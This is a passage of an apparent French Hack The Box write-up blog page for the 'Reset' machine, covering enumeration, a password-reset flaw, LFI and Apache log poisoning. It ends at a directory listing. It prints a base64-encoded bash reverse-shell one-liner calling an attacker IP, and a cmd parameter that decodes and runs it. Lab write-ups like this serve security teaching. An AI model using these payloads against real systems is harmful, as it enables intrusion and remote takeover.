@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Reset - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/reset/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="Reset">
+  <meta property="og:description" content="Reset est une machine Linux de difficulté facile qui illustre l’exploitation d’une fonctionnalité de réinitialisation de mot de passe dans une application web suite à une attaque par empoisonnement de logs, permettant d’obtenir l’exécution de code à distance. Pour l’escalade de privilèges, les Rservices sont exploités, puis une session tmux détachée est utilisée pour abuser des privilèges sudo sur l’éditeur de texte nano et exécuter des commandes en tant qu’utilisateur root.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:modified_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="LFI">
+    <meta property="article:tag" content="Log Poisoning">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Reset">
+  <meta name="twitter:description" content="Reset est une machine Linux de difficulté facile qui illustre l’exploitation d’une fonctionnalité de réinitialisation de mot de passe dans une application web suite à une attaque par empoisonnement de logs, permettant d’obtenir l’exécution de code à distance. Pour l’escalade de privilèges, les Rservices sont exploités, puis une session tmux détachée est utilisée pour abuser des privilèges sudo sur l’éditeur de texte nano et exécuter des commandes en tant qu’utilisateur root.">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/reset/" /><link rel="prev" href="http://localhost:1313/retro/" /><link rel="next" href="http://localhost:1313/querier/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Reset",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/reset\/"
+        },"genre": "posts","keywords": "Easy, Linux, LFI, Log poisoning","wordcount":  2199 ,
+        "url": "http:\/\/localhost:1313\/reset\/","datePublished": "2025-12-11T10:28:41+00:00","dateModified": "2025-12-11T10:28:41+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Reset</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;2199 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;11 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#enumération">Enumération</a>
+          <ul>
+            <li><a href="#nmap">Nmap</a></li>
+            <li><a href="#http80">HTTP(80)</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-que-www-data">Shell en tant que www-data</a>
+          <ul>
+            <li><a href="#lfi">LFI</a></li>
+            <li><a href="#log-poisonning">Log Poisonning</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-que-sadm">Shell en tant que sadm</a>
+          <ul>
+            <li><a href="#tmux">tmux</a></li>
+            <li><a href="#rlogin">Rlogin</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-que-root">Shell en tant que root</a>
+          <ul>
+            <li><a href="#nano">Nano</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Reset/reset.png"
+        data-srcset="/images/Reset/reset.png, /images/Reset/reset.png 1.5x, /images/Reset/reset.png 2x"
+        data-sizes="auto"
+        alt="/images/Reset/reset.png"
+        title="Reset" width="570" height="302" /></p>
+<p>Reset est une machine Linux de difficulté facile qui illustre l&rsquo;exploitation d&rsquo;une fonctionnalité de réinitialisation de mot de passe dans une application web suite à une attaque par <code>empoisonnement de logs</code>, permettant d&rsquo;obtenir l&rsquo;exécution de code à distance. Pour l&rsquo;escalade de privilèges, les <code>Rservices</code> sont exploités, puis une session <code>tmux</code> détachée est utilisée pour abuser des privilèges sudo sur l&rsquo;éditeur de texte <code>nano</code> et exécuter des commandes en tant qu&rsquo;utilisateur root.</p>
+<h2 id="enumération">Enumération</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Il y a 5 ports ouverts :</p>
+<ul>
+<li>22 pour SSH</li>
+<li>80 pour HTTP</li>
+<li>512, 513 et 514 pour un service nommé <code>Rlogin</code></li>
+</ul>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Reset
+</span></span><span class="line"><span class="cl">╰─➤  nmap 10.129.205.205 -vv -p- -T4
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-19 14:12 CEST
+</span></span><span class="line"><span class="cl">&lt;snip&gt;
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh     syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">80/tcp  open  http    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">512/tcp open  <span class="nb">exec</span>    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">513/tcp open  login   syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">514/tcp open  shell   syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">&lt;snip&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Reset
+</span></span><span class="line"><span class="cl">╰─➤  nmap 10.129.205.205 -p 22,80,512,513,514 -sV -sC
+</span></span><span class="line"><span class="cl">&lt;snip&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 6a161fc8fefde398a685cffe7b0e60aa <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> e408cc5f8e56258f38c3ecdfb8860c69 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp  open  http    Apache httpd 2.4.52 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Admin Login
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-cookie-flags:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   /:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     PHPSESSID:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_      httponly flag not <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">512/tcp open  <span class="nb">exec</span>    netkit-rsh rexecd
+</span></span><span class="line"><span class="cl">513/tcp open  login?
+</span></span><span class="line"><span class="cl">514/tcp open  shell   Netkit rshd
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div></div>
+<h3 id="http80">HTTP(80)</h3>
+<p>J&rsquo;arrive sur une page de login ou je teste des identifiants basiques comme <code>admin:admin</code>, <code>admin:password</code>, mais cela ne donne rien. Il n&rsquo;y a pas de message trop verbeux laissant des indices sur de potentiels utilisateurs.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Reset/Reset-17.png"
+        data-srcset="/images/Reset/Reset-17.png, /images/Reset/Reset-17.png 1.5x, /images/Reset/Reset-17.png 2x"
+        data-sizes="auto"
+        alt="/images/Reset/Reset-17.png"
+        title="/images/Reset/Reset-17.png" width="470" height="470" /></p>
+<p>Je teste alors la fonctionnalité de changement de mot de passe. J&rsquo;entre l&rsquo;utilisateur <code>admin</code> et je vois que le mot de passe a bien été changé.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Reset/Reset-1.png"
+        data-srcset="/images/Reset/Reset-1.png, /images/Reset/Reset-1.png 1.5x, /images/Reset/Reset-1.png 2x"
+        data-sizes="auto"
+        alt="/images/Reset/Reset-1.png"
+        title="/images/Reset/Reset-1.png" width="621" height="310" /></p>
+<p>Je décide alors de voir la requête envoyée sur <code>BurpSuite</code> et je vois le mot de passe en clair dans la réponse du serveur.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Reset/Reset-2.png"
+        data-srcset="/images/Reset/Reset-2.png, /images/Reset/Reset-2.png 1.5x, /images/Reset/Reset-2.png 2x"
+        data-sizes="auto"
+        alt="/images/Reset/Reset-2.png"
+        title="/images/Reset/Reset-2.png" width="1464" height="397" /></p>
+<p>Bizarre comme comportement.</p>
+<h2 id="shell-en-tant-que-www-data">Shell en tant que www-data</h2>
+<h3 id="lfi">LFI</h3>
+<p>Je me connecte alors avec les identifiants fournis et j&rsquo;arrive sur la page administrateur ou je peux voir les logs de deux fichiers. le fichier <code>syslog</code> ainsi que le <code>auth.log</code>. Mais je vois que les fichiers sont vides. Même lorsque j&rsquo;essaye de me connecter par SSH, le fichier <code>auth.log</code> reste vide.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Reset/Reset-3.png"
+        data-srcset="/images/Reset/Reset-3.png, /images/Reset/Reset-3.png 1.5x, /images/Reset/Reset-3.png 2x"
+        data-sizes="auto"
+        alt="/images/Reset/Reset-3.png"
+        title="/images/Reset/Reset-3.png" width="1501" height="478" /></p>
+<p>En regardant la requête envoyée je vois que le site effectue une requête vers répertoire le <code>/var/log</code> et lis les fichiers de logs.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Reset/Reset-4.png"
+        data-srcset="/images/Reset/Reset-4.png, /images/Reset/Reset-4.png 1.5x, /images/Reset/Reset-4.png 2x"
+        data-sizes="auto"
+        alt="/images/Reset/Reset-4.png"
+        title="/images/Reset/Reset-4.png" width="932" height="414" /></p>
+<p>Je vois que je ne peux lire que le contenu du répertoire <code>/var/log</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Reset/Reset-5.png"
+        data-srcset="/images/Reset/Reset-5.png, /images/Reset/Reset-5.png 1.5x, /images/Reset/Reset-5.png 2x"
+        data-sizes="auto"
+        alt="/images/Reset/Reset-5.png"
+        title="/images/Reset/Reset-5.png" width="1866" height="436" /></p>
+<p>J&rsquo;ai essayé d&rsquo;exécuter des commandes mais cela ne fonctionne pas.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Reset/Reset-6.png"
+        data-srcset="/images/Reset/Reset-6.png, /images/Reset/Reset-6.png 1.5x, /images/Reset/Reset-6.png 2x"
+        data-sizes="auto"
+        alt="/images/Reset/Reset-6.png"
+        title="/images/Reset/Reset-6.png" width="1870" height="475" /></p>
+<h3 id="log-poisonning">Log Poisonning</h3>
+<p>En regardant ma requête vers le fichier de logs d&rsquo;Apache, je remarque que le contenu du header <code>User-Agent</code> se trouve dans la réponse. Il s&rsquo;agit des informations du navigateur que j&rsquo;utilise. Normalement si j&rsquo;ajoute un header spécifique à ma requête, celui-ci ne sera pas automatiquement inscrit dans le fichier <code>access.log</code> du serveur Apache car ce dernier n&rsquo;est pas configuré pour inscrire cette information dans les logs.
+En tout cas là je vois une porte ouverte pour du <code>log poisonning</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Reset/Reset-7.png"
+        data-srcset="/images/Reset/Reset-7.png, /images/Reset/Reset-7.png 1.5x, /images/Reset/Reset-7.png 2x"
+        data-sizes="auto"
+        alt="/images/Reset/Reset-7.png"
+        title="/images/Reset/Reset-7.png" width="1867" height="616" /></p>
+<p>Apres quelques recherches sur le <code>log poisonning</code> sur <a href="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning" target="_blank" rel="noopener noreffer ">hackerrecipes</a>, je modifie la valeur du header <code>User-Agent</code> et je vois que cette valeur est bien prise en compte par le serveur.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Reset/Reset-8.png"
+        data-srcset="/images/Reset/Reset-8.png, /images/Reset/Reset-8.png 1.5x, /images/Reset/Reset-8.png 2x"
+        data-sizes="auto"
+        alt="/images/Reset/Reset-8.png"
+        title="/images/Reset/Reset-8.png" width="1870" height="551" /></p>
+<p>Je lance donc une requête vers le <code>/var/log/syslog</code> avec mon payload PHP dans le header <code>User-Agent</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Reset/Reset-11.png"
+        data-srcset="/images/Reset/Reset-11.png, /images/Reset/Reset-11.png 1.5x, /images/Reset/Reset-11.png 2x"
+        data-sizes="auto"
+        alt="/images/Reset/Reset-11.png"
+        title="/images/Reset/Reset-11.png" width="758" height="411" /></p>
+<p>Je vois le résultat dans les logs Apache.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">file</span><span class="o">=%</span><span class="mi">2</span><span class="n">Fvar</span><span class="o">%</span><span class="mi">2</span><span class="n">Flog</span><span class="o">%</span><span class="mi">2</span><span class="n">Fapache2</span><span class="o">%</span><span class="mi">2</span><span class="n">Faccess</span><span class="o">.</span><span class="n">log</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">id</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Reset/Reset-12.png"
+        data-srcset="/images/Reset/Reset-12.png, /images/Reset/Reset-12.png 1.5x, /images/Reset/Reset-12.png 2x"
+        data-sizes="auto"
+        alt="/images/Reset/Reset-12.png"
+        title="/images/Reset/Reset-12.png" width="1864" height="474" /></p>
+<p>Pour avoir le shell j&rsquo;ai créé encodé en base64 mon payload</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Reset
+</span></span><span class="line"><span class="cl">╰─➤  echo &#39;sh -i &gt;&amp; /dev/tcp/10.10.14.61/1234 0&gt;&amp;1&#39; | base64
+</span></span><span class="line"><span class="cl">c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvMTIzNCAwPiYxCg==</span></span></code></pre></div></div>
+<p>Ensuite je le place dans le paramètre <code>file</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">file</span><span class="o">=%</span><span class="mi">2</span><span class="n">Fvar</span><span class="o">%</span><span class="mi">2</span><span class="n">Flog</span><span class="o">%</span><span class="mi">2</span><span class="n">Fapache2</span><span class="o">%</span><span class="mi">2</span><span class="n">Faccess</span><span class="o">.</span><span class="n">log</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">echo</span><span class="o">+</span><span class="n">c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvMTIzNCAwPiYx</span><span class="o">|</span><span class="n">base64</span><span class="o">+-</span><span class="n">d</span><span class="o">|</span><span class="n">bash</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Reset/Reset-13.png"
+        data-srcset="/images/Reset/Reset-13.png, /images/Reset/Reset-13.png 1.5x, /images/Reset/Reset-13.png 2x"
+        data-sizes="auto"
+        alt="/images/Reset/Reset-13.png"
+        title="/images/Reset/Reset-13.png" width="919" height="411" /></p>
+<p>J&rsquo;obtiens ainsi un shell en tant que <code>www-data</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">╭─</span><span class="n">root</span><span class="err">@</span><span class="n">exegol</span><span class="o">-</span><span class="n">hackthebox</span> <span class="o">/</span><span class="n">workspace</span><span class="o">/</span><span class="n">Reset</span>
+</span></span><span class="line"><span class="cl"><span class="err">╰─➤</span>  <span class="n">pwncat</span><span class="o">-</span><span class="n">cs</span> <span class="p">:</span><span class="mi">1234</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">pwncat</span> <span class="err">🐈</span><span class="o">!</span>                                                                                                 <span class="n">__main__</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">164</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="n">received</span> <span class="n">connection</span> <span class="n">from</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">183.12</span><span class="p">:</span><span class="mi">39120</span>                                                                               <span class="n">bind</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">84</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">09</span><span class="p">]</span> <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">1234</span><span class="p">:</span> <span class="n">upgrading</span> <span class="n">from</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">dash</span> <span class="n">to</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>                                                            <span class="n">manager</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">957</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">183.12</span><span class="p">:</span><span class="mi">39120</span><span class="p">:</span> <span class="n">registered</span> <span class="n">new</span> <span class="n">host</span> <span class="n">w</span><span class="o">/</span> <span class="n">db</span>                                                                         <span class="n">manager</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">957</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">local</span><span class="p">)</span> <span class="n">pwncat</span><span class="o">$</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">remote</span><span class="p">)</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">reset</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span> <span class="n">id</span>
+</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">),</span><span class="mi">4</span><span class="p">(</span><span class="n">adm</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">remote</span><span class="p">)</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">reset</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span></span></span></code></pre></div></div>
+<p>Dans le répertoire <code>/var/www/html/private_34eee5d2</code> se trouve la base de données ne contenant que les identifiants de l&rsquo;administrateur. Mais je n&rsquo;ai pas reussit à le cracker. Meme si j&rsquo;imagine que le mot de passe est celui qui a été généré lors du changement de mot de passe.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">(</span><span class="n">remote</span><span class="p">)</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">reset</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+</span></span><span class="line"><span class="cl"><span class="n">total</span> <span class="mi">28</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Dec</span>  <span class="mi">7</span>  <span class="mi">2024</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Dec</span>  <span class="mi">6</span>  <span class="mi">2024</span> <span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">2795</span> <span class="n">Dec</span>  <span class="mi">7</span>  <span class="mi">2024</span> <span class="n">dashboard</span><span class="o">.</span><span class="n">php</span>
